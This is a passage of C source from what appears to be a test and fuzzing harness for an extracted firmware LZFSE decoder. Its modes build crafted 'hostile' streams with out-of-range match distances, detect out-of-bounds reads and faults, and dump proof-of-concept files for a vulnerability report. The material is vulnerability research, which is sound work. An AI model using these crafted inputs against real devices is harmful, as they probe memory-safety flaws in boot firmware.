  /* =================== MODE q1r: semi-synthetic (real header) staging sweep =================== */
  if (!strcmp(mode, "q1r")) {
    tb_init();
    harvest_real_header();
    printf("harvest real canonical header: ok=%d\n", g_hreal_ok);
    struct buf dst, scr, st;
    mkbuf(&dst, 65536); mkbuf(&scr, SCRATCH_SZ); mkbuf(&st, 262144);
    u8 blk[16384];
    #define RUNREAL(tag, id_, T_, L_, M_, Darr, cmp_) do { \
      long bl_ = build_bvx1_real(blk, sizeof(blk), T_, L_, M_, Darr); \
      wr32(blk + bl_, 0x24787662); bl_ += 4; \
      memset(dst.payload, 0x11, dst.cap); memset(st.payload, 0, 262144); \
      struct R r_; \
      if (bl_ < 0) { printf("  %-30s build fail %ld\n", tag, bl_); break; } \
      if (id_) GUARDED(g_disp(dst.payload, dst.cap, blk, bl_, scr.payload, (u32)(id_)), r_); \
      else     GUARDED(g_direct(dst.payload, dst.cap, blk, bl_, st.payload), r_); \
      long prod_ = r_.faulted ? -1 : (id_ ? r_.ret : (long)(rd64(st.payload+0x28)-rd64(st.payload+0x18))); \
      int mdl_ = 0; \
      if (cmp_ && prod_ == (long)((T_)*(L_)+(T_)*(M_))) { \
        u8 *mm_ = malloc((T_)*(L_)+(T_)*(M_)); size_t cu_=0; \
        for (int k2=0;k2<(T_);k2++){ for(int i2=0;i2<(L_);i2++) mm_[cu_++]=0x41; \
          for(int i2=0;i2<(M_);i2++){ mm_[cu_]=mm_[cu_-(Darr)[k2]]; cu_++; } } \
        mdl_ = !memcmp(dst.payload, mm_, cu_); free(mm_); \
      } \
      if (!r_.faulted && id_ && prod_ <= 0) { \
        const u8 *S_ = scr.payload; \
        printf("    [staging state] phase=%08x srccur=%llu dstcur=%llu +44=%u +48=%u +4C=%u +50=%u +54=%u limit=%u\n", \
               rd32(S_+0x34), (unsigned long long)(rd64(S_+0x00)-rd64(S_+0x08)), (unsigned long long)(rd64(S_+0x18)-rd64(S_+0x20)), \
               rd32(S_+0x44), rd32(S_+0x48), rd32(S_+0x4C), rd32(S_+0x50), rd32(S_+0x54), rd32(S_+0x1C88)); \
      } \
      printf("  %-30s ret=%ld faulted=%d model=%d foreign=", tag, prod_, r_.faulted, mdl_); \
      int fr_=0; for(size_t i3=0;i3<dst.lo_sz;i3++) if(dst.lo[i3]!=0xA5){fr_|=1;break;} \
      for(size_t i3=0;i3<dst.hi_sz;i3++) if(dst.hi[i3]!=0x5A){fr_|=2;break;} \
      printf("%d", fr_); \
      if (r_.faulted) printf(" FAULT pc=%llx addr=%llx sig=%d", r_.f.pc, r_.f.addr, r_.f.signo); \
      printf("\n"); \
    } while (0)

    // benign: T=8 D=4/5 through all paths
    {
      u32 D8[8]; for (int k=0;k<8;k++) D8[k] = (k%2)?5:4;
      RUNREAL("benign T=8 D=4/5 direct", 0,    8, 4, 4, D8, 1);
      RUNREAL("benign T=8 D=4/5 0x891",  0x891,8, 4, 4, D8, 1);
      RUNREAL("benign T=8 D=4/5 0x801",  0x801,8, 4, 4, D8, 1);
      RUNREAL("benign T=8 D=4/5 0x802",  0x802,8, 4, 4, D8, 1);
    }
    // hostile: warm block then huge-D block; distances per-block single-symbol
    {
      u32 Dw[4] = {4,5,4,5};
      u32 Dh1[4] = {1000,1001,1002,1003};       // sym? base 892 w=9 -> [892..1147]
      u32 Dh2[4] = {262130,262135,262138,262139}; // sym63 [229372+..]
      u32 Dh3[4] = {229372,229373,230000,231000};
      // 2 blocks concatenated manually
      long b1 = build_bvx1_real(blk, sizeof(blk), 4, 4, 4, Dw);
      long b2 = build_bvx1_real(blk + b1, sizeof(blk) - b1, 4, 15, 8, Dh1);
      for (int id = 0; id <= 0x802; id += (id == 0 ? 0x891 : 1)) {
        memset(dst.payload, 0x11, dst.cap); memset(st.payload, 0, 262144);
        struct R r_;
        if (id) GUARDED(g_disp(dst.payload, dst.cap, blk, b1+b2, scr.payload, (u32)(id?id:0x891)), r_);
        else    GUARDED(g_direct(dst.payload, dst.cap, blk, b1+b2, st.payload), r_);
        printf("  hostile D~1000 id=%#05x: ret=%ld faulted=%d", id?id:0x891,
               id ? r_.ret : (long)(rd64(st.payload+0x28)-rd64(st.payload+0x18)), r_.faulted);
        if (r_.faulted) printf(" FAULT pc=%llx addr=%llx", r_.f.pc, r_.f.addr);
        printf("\n");
      }
      b2 = build_bvx1_real(blk + b1, sizeof(blk) - b1, 4, 15, 8, Dh2);
      for (int ii = 0; ii < 2; ii++) {
        memset(dst.payload, 0x11, dst.cap); memset(st.payload, 0, 262144);
        struct R r_;
        if (ii) GUARDED(g_disp(dst.payload, dst.cap, blk, b1+b2, scr.payload, 0x891), r_);
        else    GUARDED(g_direct(dst.payload, dst.cap, blk, b1+b2, st.payload), r_);
        printf("  hostile D~262139 %s: faulted=%d", ii ? "disp891" : "direct ", r_.faulted);
        if (!r_.faulted && !ii) printf(" produced=%llu", (unsigned long long)(rd64(st.payload+0x28)-rd64(st.payload+0x18)));
        else if (!r_.faulted && ii) printf(" ret=%ld", r_.ret);
        if (r_.faulted) printf(" FAULT pc=%llx addr=%llx", r_.f.pc, r_.f.addr);
        printf("\n");
      }
      (void)Dh3;
    }
    rmbuf(&dst); rmbuf(&scr); rmbuf(&st);
    return 0;
  }

  /* =================== MODE q2: inline chunked decoder (ids 0xA00-0xAFF -> 0xA18) =================== */
  if (!strcmp(mode, "q2")) {
    printf("== Q2: inline chunked decoder ==\n");
    struct buf dst, scr; mkbuf(&dst, 65536); mkbuf(&scr, SCRATCH_SZ);
    u8 stream[16384];
    u8 model[65536];

    // token: u32 LE {lit=L[4:0], M=[9:5], dist=[23:10]} followed by L literal bytes.
    struct em { u8 *s; size_t p; size_t out; };
    #define EM_INIT(em_, buf_) do { em_.s=(buf_); em_.p=4; em_.out=0; wr32(em_.s,0); } while (0)
    #define EM_TOK(em_, L_, M_, D_, litp_) do { \
      wr32(em_.s + em_.p, ((u32)(D_) << 10) | ((u32)(M_) << 5) | (u32)(L_)); \
      u32 _D = (u32)(D_); \
      if (litp_) memcpy(em_.s + em_.p + 3, litp_, (L_)); else memset(em_.s + em_.p + 3, 0x41, (L_)); \
      em_.p += 3 + (L_); em_.out += (L_); \
      for (int _i = 0; _i < (L_); _i++) model[em_.out - (L_) + _i] = (litp_) ? ((u8*)litp_)[_i] : 0x41; \
      for (int _i = 0; _i < (M_) && (_D) <= em_.out; _i++) { model[em_.out] = model[em_.out - (_D)]; em_.out++; } \
    } while (0)
    #define EM_RAW(em_, byte_, n_) do { wr16(em_.s + em_.p, 0); em_.p += 2; \
      for (int _i = 0; _i < (n_); _i++) { em_.s[em_.p++] = (byte_) + (_i & 0xf); model[em_.out++] = (byte_) + (_i & 0xf); } } while (0)
    #define EM_FINISH(em_) do { wr32(em_.s, (u32)em_.out); memset(em_.s + em_.p, 0xCC, 64); em_.p += 64; } while (0)

    #define RUNC(tag, elen, want_) do { \
      memset(dst.payload, 0x11, dst.cap); \
      struct R r_; GUARDED(g_disp(dst.payload, dst.cap, stream, elen, scr.payload, 0xA18), r_); \
      printf("  %-30s ret=%ld faulted=%d", tag, r_.ret, r_.faulted); \
      if (r_.faulted) printf(" pc=%llx addr=%llx sig=%d", r_.f.pc, r_.f.addr, r_.f.signo); \
      if (!r_.faulted) { \
        if ((size_t)r_.ret == (want_) && (want_) > 0 && !memcmp(dst.payload, model, (want_))) printf(" MODEL-MATCH(%zu)", (size_t)(want_)); \
        else if ((want_) == 0 && r_.ret == 0) printf(" REJECTED"); \
        else { printf(" MISMATCH ret=%zd want=%zu", r_.ret, (size_t)(want_)); \
               if (r_.ret > 0) { size_t d_=first_diff(dst.payload, model, (size_t)r_.ret<(want_)?(size_t)r_.ret:(want_)); printf(" diff@%zd", d_==(size_t)-1?-1:(ssize_t)d_);} } \
      } \
      int fr_=0; for(size_t i3=0;i3<dst.lo_sz;i3++) if(dst.lo[i3]!=0xA5){fr_|=1;break;} \
      for(size_t i3=0;i3<dst.hi_sz;i3++) if(dst.hi[i3]!=0x5A){fr_|=2;break;} \
      if (fr_) printf(" FOREIGN=%d", fr_); \
      printf("\n"); \
    } while (0)

    struct em e;
    // ---- benign: raw 4096 + compressed piece (dist>=32 correctness) ----
    memset(model, 0, sizeof(model));
    EM_INIT(e, stream);
    EM_RAW(e, 0x20, 4096);                       // piece 1: budget 4096 raw (u16[0]==0)
    {                                             // piece 2: compressed — first token's low16 != 0
      u8 lits[32]; for (int i=0;i<32;i++) lits[i]=(u8)(0x41+i);
      EM_TOK(e, 31, 0, 1, lits);                  // 32 lits
      EM_TOK(e, 16, 16, 48, NULL);                // +16 lits, copy 16 @dist48
    }
    size_t blen = e.p; EM_FINISH(e);
    size_t bn = e.out; (void)blen;
    RUNC("benign multi-piece d>=32", e.p, e.out);

    // ---- hostile dist = produced+1 ----
    memset(model, 0, sizeof(model));
    EM_INIT(e, stream);
    { u8 lits[32]; for (int i=0;i<31;i++) lits[i]=0x42;
      EM_TOK(e, 31, 0, 1, lits); }
    // after tok1's own 16 literals, produced = 47; dist=48 is one PAST it
    EM_TOK(e, 16, 8, 48, NULL);
    EM_FINISH(e);
    RUNC("hostile dist=produced+1", e.p, 0);

    // ---- hostile dist = 16383 max ----
    memset(model, 0, sizeof(model));
    EM_INIT(e, stream);
    { u8 lits[32]; for (int i=0;i<32;i++) lits[i]=0x43;
      EM_TOK(e, 31, 0, 1, lits); }
    EM_TOK(e, 31, 31, 16383, NULL);
    EM_FINISH(e);
    RUNC("hostile dist=16383", e.p, 0);

    // ---- edge dist == produced exactly ----
    memset(model, 0, sizeof(model));
    EM_INIT(e, stream);
    { u8 lits[32]; for (int i=0;i<32;i++) { lits[i]=(u8)(0x50+i); } 
      EM_TOK(e, 31, 0, 1, lits); }
    EM_TOK(e, 0, 31, 31, NULL);                   // copy 31 @dist==produced(31)
    EM_FINISH(e);
    RUNC("edge dist==produced M=32", e.p, e.out);

    // ---- overrun: single token exceeds piece budget ----
    memset(model, 0, sizeof(model));
    EM_INIT(e, stream);
    wr32(stream, 8);                              // total=8 but token makes 32+
    EM_TOK(e, 24, 8, 1, NULL);
    EM_FINISH(e);
    RUNC("overrun budget8 need32", e.p, 0);

    // ---- truncated literal bytes in src ----
    memset(model, 0, sizeof(model));
    EM_INIT(e, stream);
    wr32(stream + e.p, (1u<<10)|(0u<<5)|31u); e.p += 4;
    memcpy(stream + e.p, "ABCDEFGHIJ", 10); e.p += 10;   // only 10 of 31 lits
    RUNC("src truncated mid-lits", e.p, 0);

    // ---- raw piece truncated ----
    memset(model, 0, sizeof(model));
    EM_INIT(e, stream);
    wr32(stream, 300);
    wr16(stream + 4, 0); e.p = 6;
    for (int i=0;i<50;i++) stream[e.p++] = 0x44;
    RUNC("raw piece truncated", e.p, 0);

    // ---- total > dstcap ----
    memset(model, 0, sizeof(model));
    EM_INIT(e, stream);
    EM_TOK(e, 8, 0, 1, NULL);
    wr32(stream, 999999);                        // total > dstcap (set AFTER emit)
    memset(stream + e.p, 0xCC, 64); e.p += 64;
    RUNC("total>dstcap", e.p, 0);

    // ---- fuzz: structured-random hostile tokens ----
    int faults = 0, rejects = 0, accepts = 0;
    for (int t = 0; t < 5000; t++) {
      memset(dst.payload, 0x11, dst.cap);
      e.s = stream; e.p = 4; e.out = 0;
      u32 tot = (u32)((t * 2654435761u) % 400) + 1;
      wr32(stream, tot);
      int ntok = 1 + (int)((t * 40503u) % 6);
      for (int k = 0; k < ntok; k++) {
        u32 rr = t * 2246822519u + k * 3266489917u;
        u32 L1 = rr % 32; rr >>= 5;
        u32 M1 = rr % 32; rr >>= 5;
        u32 dd = (t % 3 == 0) ? (rr % 16384) : (rr % 48);
        wr32(stream + e.p, (dd << 10) | (M1 << 5) | L1); e.p += 4;
        for (u32 i = 0; i < L1; i++) stream[e.p++] = (u8)(0x30 + ((rr >> ((i*5)%13)) & 7));
        e.out += L1;
        for (u32 i = 0; i < M1 && e.out < 70000 && dd <= e.out; i++) { model[e.out] = model[e.out - dd]; e.out++; }
        e.p += 8;
      }
      memset(stream + e.p, 0xCC, 64); e.p += 64;
      struct R r_;
      GUARDED(g_disp(dst.payload, dst.cap, stream, e.p, scr.payload, 0xA18), r_);
      if (r_.faulted) { faults++; printf("  FUZZ FAULT t=%d pc=%llx addr=%llx sig=%d\n", t, r_.f.pc, r_.f.addr, r_.f.signo); }
      else if (r_.ret == 0) rejects++;
      else accepts++;
      int fr2 = 0;
      for (size_t i_ = 0; i_ < dst.lo_sz; i_++) if (dst.lo[i_] != 0xA5) { fr2 |= 1; break; }
      for (size_t i_ = 0; i_ < dst.hi_sz; i_++) if (dst.hi[i_] != 0x5A) { fr2 |= 2; break; }
      if (fr2) { printf("  FUZZ FOREIGN t=%d mask=%d\n", t, fr2); faults++; }
    }
    printf("  fuzz summary: faults=%d rejects=%d accepts=%d\n", faults, rejects, accepts);
    rmbuf(&dst); rmbuf(&scr);
    return 0;
  }

  /* =================== MODE q3: bonus questions =================== */
  if (!strcmp(mode, "q3")) {
    tb_init();
    printf("== Q3a: trailing-match truncation (n_matches %% 4) ==\n");
    {
      for (int T = 4; T <= 8; T++) {
        struct cell c; struct cellout o;
        memset(&c, 0, sizeof(c)); c.nb = 1; c.nopad = 1;
        c.L[0] = 4; c.M[0] = 4;
        for (int k = 0; k < 8; k++) c.D[0][k] = (k % 2) ? 5 : 4;
        c.id = 0; c.T[0] = T;
        run_cell(&c, &o, 0);
        printf("  direct T=%d: ret=%ld (full would be %d) faulted=%d %s\n", T, o.ret, T * 8, o.r.faulted, o.note);
        c.id = 0x891; run_cell(&c, &o, 0);
        printf("  0x891  T=%d: ret=%ld (full would be %d) faulted=%d %s\n", T, o.ret, T * 8, o.r.faulted, o.note);
      }
    }
    printf("== Q3a-part2: raw 'bvx-' word-truncation + cross-block group-state carry ==\n");
    {
      // raw block through BOTH paths: count=63 -> expect 60 (direct) vs 63 (staging?)
      struct buf dst, scr, st;
      mkbuf(&dst, 65536); mkbuf(&scr, SCRATCH_SZ); mkbuf(&st, 262144);
      u8 sb[256];
      wr32(sb + 0, 0x2d787662);
      wr32(sb + 4, 63);
      for (int i = 0; i < 63; i++) sb[8+i] = (u8)(0x30 + i);
      memset(dst.payload, 0x11, dst.cap);
      struct R r_; GUARDED(g_direct(dst.payload, dst.cap, sb, 8+63, st.payload), r_);
      printf("  raw63 direct : produced=%zu (63 expected if no truncation)\n",
             produced_len(dst.payload, 256, 0x11));
      wr32(sb + 8 + 63, 0x24787662);   // terminator for staging
      memset(dst.payload, 0x11, dst.cap);
      GUARDED(g_disp(dst.payload, dst.cap, sb, 8+63+4, scr.payload, 0x891), r_);
      printf("  raw63 0x891  : ret=%ld faulted=%d (produced=%llu)\n", r_.ret, r_.faulted,
             (unsigned long long)(rd64(scr.payload+0x18)-rd64(scr.payload+0x20)));
      // cross-block: block1 T=4 (clean %4) vs T=5 (dirty), each followed by block2 T=1
      struct cell c; memset(&c, 0, sizeof(c)); struct cellout o;
      c.id = 0; c.nb = 2;
      c.L[0]=4; c.M[0]=4; for (int k=0;k<8;k++) c.D[0][k]=(k%2)?5:4;
      c.L[1]=4; c.M[1]=4; c.D[1][0]=4; c.D[1][1]=4; c.D[1][2]=4; c.D[1][3]=4;
      c.T[0]=4; c.T[1]=1;                       // clean
      run_cell(&c, &o, 1);
      printf("  b1:T=4 clean + b2:T=1 -> ret=%ld (want 40) model=%d\n", o.ret, o.model_ok);
      c.T[0]=5;                                  // dirty tail
      run_cell(&c, &o, 1);
      printf("  b1:T=5 dirty + b2:T=1 -> ret=%ld (want 48 padded) model=%d\n", o.ret, o.model_ok);
      // UNPADDED cross-block carry probe
      {
        struct cell c2; memset(&c2, 0, sizeof(c2)); struct cellout o2;
        c2.id = 0; c2.nb = 2; c2.nopad = 1;
        c2.L[0]=4; c2.M[0]=4; for (int k=0;k<8;k++) c2.D[0][k]=(k%2)?5:4;
        c2.L[1]=15; c2.M[1]=8; c2.D[1][0]=23;
        c2.T[0]=5; c2.T[1]=1;
        printf("  [probe start]\n"); fflush(stdout);
        run_cell(&c2, &o2, 1);
        printf("  NOPAD b1:T=5 + b2:T=1(L15,M8,D23) -> ret=%ld faulted=%d model=%d %s\n",
               o2.ret, o2.r.faulted, o2.model_ok, o2.note);
      }
      rmbuf(&dst); rmbuf(&scr); rmbuf(&st);
    }
    printf("== Q3b: distance ceiling on the unguarded direct path ==\n");
    {
      // max encodable D = base[63] + 2^15 - 1
      u32 dmax = TB_D_BASE[63] + ((1u << TB_D_XTRA[63]) - 1);
      printf("  firmware tables: base[63]=%u extra[63]=%d bits -> D_max=%u\n",
             TB_D_BASE[63], TB_D_XTRA[63], dmax);
      const u32 Ds[] = { 229372, 262130, 262138, 262139 };
      struct buf dstq; mkbuf(&dstq, 65536);
      printf("  dst payload base = %p\n", (void*)dstq.payload);
      for (unsigned di = 0; di < sizeof(Ds)/sizeof(Ds[0]); di++) {
        struct cell c; struct cellout o;
        memset(&c, 0, sizeof(c)); c.nb = 2; c.id = 0;
        c.T[0]=1; c.L[0]=4; c.M[0]=4; c.D[0][0]=4;
        c.T[1]=1; c.L[1]=15; c.M[1]=8; c.D[1][0]=Ds[di];
        run_cell(&c, &o, 0);
        printf("  direct D=%6u: ret=%ld faulted=%d", Ds[di], o.ret, o.r.faulted);
        if (o.r.faulted && o.dstbase) printf(" pc=%llx addr=%llx delta=%+lld bytes vs dst_begin",
                                o.r.f.pc, o.r.f.addr, (long long)(o.r.f.addr - (u64)o.dstbase));
        printf("\n");
      }
      // one byte beyond the encodable ceiling is unrepresentable:
      rmbuf(&dstq);
      int s, W; u32 ex;
      int e1 = dist_encode(262139, &s, &ex, &W);
      int e2 = dist_encode(262140, &s, &ex, &W);
      printf("  dist_encode(262139)=%d  dist_encode(262140)=%d (expected -1)\n", e1, e2);
    }
    return 0;
  }


  /* =================== MODE dbg: table + header introspection =================== */
  if (!strcmp(mode, "dbg")) {
    tb_init();
    hexdump("raw 0x331330..0x331420", g_fw+0x331330, 0xF0);
    printf("LR_BASE[0..19]:"); for (int i=0;i<20;i++) printf(" %u", TB_LR_BASE[i]); printf("\n");
    printf("LR_XTRA[0..19]:"); for (int i=0;i<20;i++) printf(" %d", TB_LR_XTRA[i]); printf("\n");
    printf("ML_BASE[0..19]:"); for (int i=0;i<20;i++) printf(" %u", TB_ML_BASE[i]); printf("\n");
    printf("ML_XTRA[0..19]:"); for (int i=0;i<20;i++) printf(" %d", TB_ML_XTRA[i]); printf("\n");
    printf("D_BASE[60..63]:"); for (int i=60;i<64;i++) printf(" %u", TB_D_BASE[i]); printf("\n");
    printf("D_XTRA[0..19]:");  for (int i=0;i<20;i++) printf(" %d", TB_D_XTRA[i]); printf("\n");
    int s,W; u32 ex;
    printf("dist_encode(1)=%d\n", dist_encode(1,&s,&ex,&W));
    printf("dist_encode(24)=%d sym=%d ex=%u W=%d\n", dist_encode(24,&s,&ex,&W), s,ex,W);
    // dump a synthetic benign header
    u32 D[8]={1,2,3,4,5,6,7,8};
    u8 blk[4096]; long bl = build_bvx1(blk,sizeof(blk),8,4,4,D);
    printf("build_bvx1 -> %ld\n", bl);
    if (bl>0) {
      hexdump("synth hdr first 0x40", blk, 0x40);
      u32 sl=0,sm=0,sd=0,sb=0;
      for(int i=0;i<20;i++) sl+=rd16(blk+0x32+2*i);
      for(int i=0;i<20;i++) sm+=rd16(blk+0x5A+2*i);
      for(int i=0;i<64;i++) sd+=rd16(blk+0x82+2*i);
      for(int i=0;i<256;i++) sb+=rd16(blk+0x102+2*i);
      printf("freqsums l=%u m=%u d=%u lit=%u  Lsym_freq=%u Msym=%u\n",sl,sm,sd,sb, rd16(blk+0x32+2*3), rd16(blk+0x5A+2*3));
      printf("lmd stream (%u bytes):", rd32(blk+0x18));
      size_t lm = rd32(blk+0x18);
      for (size_t i=0;i<lm && i<24;i++) printf(" %02x", blk[HDR_SZ+i]);
      printf("\n");
    }
    return 0;
  }

  /* =================== MODE replay: canonical-hdr + payload as bvx1 =================== */
  if (!strcmp(mode, "replay")) {
    tb_init();
    FILE *f = fopen("/tmp/ds_iboot/harness/same64k.lz", "rb");
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    u8 *d = malloc(sz); fread(d, 1, sz, f); fclose(f);
    printf("same64k.lz %ld bytes, magic %08x, hdr_size_field=%u\n", sz, rd32(d), rd32(d+0x18));
    long hs = (long)(rd32(d+0x18) & 0xffffffffU);
    struct buf st; mkbuf(&st, 262144); memset(st.payload, 0, 262144);
    struct buf dst; mkbuf(&dst, 200000); memset(dst.payload, 0xCC, dst.cap);
    struct R r; GUARDED(g_direct(dst.payload, dst.cap, d, sz, st.payload), r);
    printf("original bvx2 decode: faulted=%d produced=%zu\n", r.faulted,
           produced_len(dst.payload, 256, 0xCC));
    const u8 *H = st.payload + 0x3C;
    // rebuild as bvx1
    u8 *rep = malloc(sz + 0x400);
    memcpy(rep, H, HDR_SZ);
    memcpy(rep + HDR_SZ, d + hs, sz - hs);
    printf("replay block: hdr 0x304 + payload %ld = %ld total\n", sz - hs, HDR_SZ + sz - hs);
    memset(dst.payload, 0xCC, dst.cap);
    memset(st.payload, 0, 262144);
    GUARDED(g_direct(dst.payload, dst.cap, rep, HDR_SZ + sz - hs, st.payload), r);
    printf("replayed bvx1 decode (direct): faulted=%d first-bytes-match-A=%d produced=%zu\n",
           r.faulted, dst.payload[0]=='A' && dst.payload[1000]=='A', produced_len(dst.payload, 70000, 0xCC));
    if (r.faulted) printf("  FAULT pc=%llx addr=%llx\n", r.f.pc, r.f.addr);
    // also through dispatcher staging id 0x891
    struct buf scr; mkbuf(&scr, SCRATCH_SZ);
    memset(dst.payload, 0xCC, dst.cap);
    GUARDED(g_disp(dst.payload, dst.cap, rep, HDR_SZ + sz - hs, scr.payload, 0x891), r);
    printf("replayed bvx1 decode (disp891): ret=%ld faulted=%d produced=%zu\n", r.ret, r.faulted,
           produced_len(dst.payload, 70000, 0xCC));
    if (r.faulted) printf("  FAULT pc=%llx addr=%llx\n", r.f.pc, r.f.addr);
    rmbuf(&st); rmbuf(&dst); rmbuf(&scr); free(d); free(rep);
    return 0;
  }

  /* =================== MODE dbg2: one-field-at-a-time mutation bisect =================== */
  if (!strcmp(mode, "dbg2")) {
    tb_init();
    FILE *f = fopen("/tmp/ds_iboot/harness/same64k.lz", "rb");
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    u8 *d = malloc(sz); fread(d, 1, sz, f); fclose(f);
    long hs = (long)(rd32(d+0x18) & 0xffffffffU);
    struct buf st; mkbuf(&st, 262144);
    struct buf dst; mkbuf(&dst, 200000);
    struct R r;
    // get canonical header
    GUARDED(g_direct(dst.payload, dst.cap, d, sz, st.payload), r);
    u8 H0[HDR_SZ]; memcpy(H0, st.payload + 0x3C, HDR_SZ);
    u8 H[HDR_SZ];
    // baseline replay
    u8 *rep = malloc(sz + 0x800);
    #define REPLAY(tag) do { \
      memcpy(rep, H, HDR_SZ); memcpy(rep + HDR_SZ, d + hs, sz - hs); \
      memset(dst.payload, 0xCC, dst.cap); memset(st.payload, 0, 262144); \
      GUARDED(g_direct(dst.payload, dst.cap, rep, HDR_SZ + sz - hs, st.payload), r); \
      size_t pr_ = produced_len(dst.payload, 70000, 0xCC); \
      int aok_ = dst.payload[0]=='A' && dst.payload[65535]=='A'; \
      printf("  %-34s faulted=%d produced=%6zu allA=%d\n", tag, r.faulted, pr_, aok_); \
      if (r.faulted) printf("     FAULT pc=%llx addr=%llx\n", r.f.pc, r.f.addr); \
    } while (0)
    memcpy(H, H0, HDR_SZ); REPLAY("baseline (real hdr)");
    memcpy(H, H0, HDR_SZ); wr32(H+0x04, 64);            REPLAY("+04 out=64");
    memcpy(H, H0, HDR_SZ); wr32(H+0x0C, 32);            REPLAY("+0C nlit=32");
    memcpy(H, H0, HDR_SZ); wr32(H+0x10, 8);             REPLAY("+10 nmatch=8");
    memcpy(H, H0, HDR_SZ); wr16(H+0x20, 0); wr16(H+0x22,0); wr16(H+0x24,0); wr16(H+0x26,0); REPLAY("lit states=0");
    memcpy(H, H0, HDR_SZ); wr32(H+0x2C, 0);             REPLAY("+2C m/lr init=0");
    memcpy(H, H0, HDR_SZ); wr16(H+0x30, 0);             REPLAY("+30 dist init=0");
    memcpy(H, H0, HDR_SZ); wr32(H+0x28, 0xFFFFFFF8u);   REPLAY("+28 sellmd=-8");
    memcpy(H, H0, HDR_SZ); wr32(H+0x28, -4);            REPLAY("+28 sellmd=-4");
    memcpy(H, H0, HDR_SZ); wr32(H+0x28, -1);            REPLAY("+28 sellmd=-1");
    // freq swaps (payload stays real -> output will be wrong; only checking ACCEPT vs REJECT)
    memcpy(H, H0, HDR_SZ);
    for (int i = 0; i < 20; i++) wr16(H+0x32+2*i, i==4?64:0);
    REPLAY("l_freq={sym4:64}");
    memcpy(H, H0, HDR_SZ);
    for (int i = 0; i < 20; i++) wr16(H+0x5A+2*i, i==3?64:0);
    REPLAY("m_freq={sym3:64}");
    memcpy(H, H0, HDR_SZ);
    for (int i = 0; i < 64; i++) wr16(H+0x82+2*i, i==11?256:0);
    REPLAY("d_freq={sym11:256}");
    memcpy(H, H0, HDR_SZ);
    for (int i = 0; i < 256; i++) wr16(H+0x102+2*i, i==0x41?1024:0);
    REPLAY("lit_freq={A:1024}");
    rmbuf(&st); rmbuf(&dst); free(d); free(rep);
    return 0;
  }


  /* =================== MODE dbg8: edge-dist micro-sweep =================== */
  if (!strcmp(mode, "dbg8")) {
    struct buf dst, scr; mkbuf(&dst, 65536); mkbuf(&scr, SCRATCH_SZ);
    u8 stream[4096]; u8 lits[31]; static u8 model[4096];
    for (int i=0;i<31;i++) lits[i]=(u8)(0x50+i);
    struct { int L,M,D; const char *tag; } v[] = {
      {0,16,16,"tok1=(0,16,D=16)"},
      {0,31,31,"tok1=(0,31,D=31)"},
      {1,31,31,"tok1=(1,31,D=31)"},
      {0,31,30,"tok1=(0,31,D=30)"},
      {0,8,8,"tok1=(0,8,D=8)"},
    };
    for (unsigned vi=0; vi<sizeof(v)/sizeof(v[0]); vi++) {
      size_t p=4; wr32(stream,0); 
      u32 out=0;
      // tok0
      wr32(stream+p,(1u<<10)|(0u<<5)|31u);
      memcpy(stream+p+3,lits,31); p+=3+31; out+=31;
      memcpy(model, lits, 31); out=31;
      // tok1
      wr32(stream+p,(u32)(v[vi].D)<<10|(u32)(v[vi].M)<<5|(u32)(v[vi].L)); p+=3+v[vi].L;
      wr32(stream,(u32)(out+v[vi].M));
      memset(stream+p,0xCC,64); p+=64;
      memset(dst.payload,0x11,dst.cap);
      struct R r_; GUARDED(g_disp(dst.payload,dst.cap,stream,p,scr.payload,0xA18),r_);
      printf("  %-22s want=%u ret=%ld faulted=%d match=%d\n", v[vi].tag, out+v[vi].M, r_.ret, r_.faulted,
             (!r_.faulted && r_.ret>0) ? !memcmp(dst.payload,model,r_.ret>(long)(out+v[vi].M)?(out+v[vi].M):r_.ret) : 0);
    }
    rmbuf(&dst); rmbuf(&scr);
    return 0;
  }

  /* =================== MODE leak: direct-copier silent under-read demonstration =================== */
  if (!strcmp(mode, "leak")) {
    tb_init();
    printf("== Direct copier (FUN_001EA100): silent read below dst_begin ==\n");
    struct cell c; memset(&c, 0, sizeof(c)); struct cellout o;
    c.id = 0; c.nb = 2;                       // b1 pads T1->4: P=32 before b2
    c.T[0]=4; c.L[0]=4;  c.M[0]=4; for (int k=0;k<4;k++) c.D[0][k]=(k%2)?5:4;
    c.T[1]=4; c.L[1]=15; c.M[1]=8;
    const u32 Ds[] = { 47, 48, 49, 50, 52, 56 };
    for (unsigned di = 0; di < sizeof(Ds)/sizeof(Ds[0]); di++) {
      for (int k=0;k<4;k++) c.D[1][k] = Ds[di];
      run_cell(&c, &o, 0);
      // scan output for foreign 0xA5 (lower-apron fill)
      int a5count = 0; size_t firstA5 = (size_t)-1;
      if (!o.r.faulted && o.ret > 0)
        for (size_t i = 32; i < o.snaplen; i++)
          if (o.snap[i] == 0xA5) { if (firstA5 == (size_t)-1) firstA5 = i; a5count++; }
      printf("  D=%3u: ret=%ld faulted=%d", Ds[di], o.ret, o.r.faulted);
      if (o.r.faulted) printf(" pc=%llx addr=%llx delta=%+lld", o.r.f.pc, o.r.f.addr,
                              (long long)(o.r.f.addr - (u64)o.dstbase));
      else if (a5count) printf(" FOREIGN-A5-BYTES=%d first@%zu", a5count, firstA5);
      printf("\n");
    }
    return 0;
  }

  /* =================== MODE leakpoc: Report-3 evidence battery + PoC dump =====
   * A) silent-leak cells D = P+L+1 .. P+L+9 (P=32, L=15 => D=48..56) through the
   *    direct core AND staging dispatcher id 0x8A1; output scanned for foreign
   *    lower-apron bytes (marker-diff count + first offset).
   * B) large-D fault cell (D=262139, read lands in the PROT_NONE guard below the
   *    64KB apron): fault receipt with pc_off (copier load @0x1EA188 old build /
   *    @0x1EA208 new build) and delta vs dst_begin.
   * C) dumps the EXACT bvx1 streams used by cells to $DS_POC3DIR (default
   *    /private/tmp/ds_iboot/Report3_LZFSE): poc_lzfse_oobread.bin (leak cell,
   *    D=P+L+1=48) and poc_lzfse_fault.bin (fault cell, D=262139), with field
   *    annotations printed. Replay from disk: qsweep poclf <file>. */
  if (!strcmp(mode, "leakpoc")) {
    tb_init();
    const char *dir = getenv("DS_POC3DIR");
    if (!dir) dir = "/private/tmp/ds_iboot/Report3_LZFSE";
    printf("== LEAKPOC: LZFSE bvx1 backward OOB-read evidence battery ==\n");
    struct cell c; memset(&c, 0, sizeof(c)); struct cellout o;
    c.nb = 2;                                  // b1 pads T->4: P=32 before b2
    c.T[0]=4; c.L[0]=4;  c.M[0]=4; for (int k=0;k<4;k++) c.D[0][k]=(k%2)?5:4;
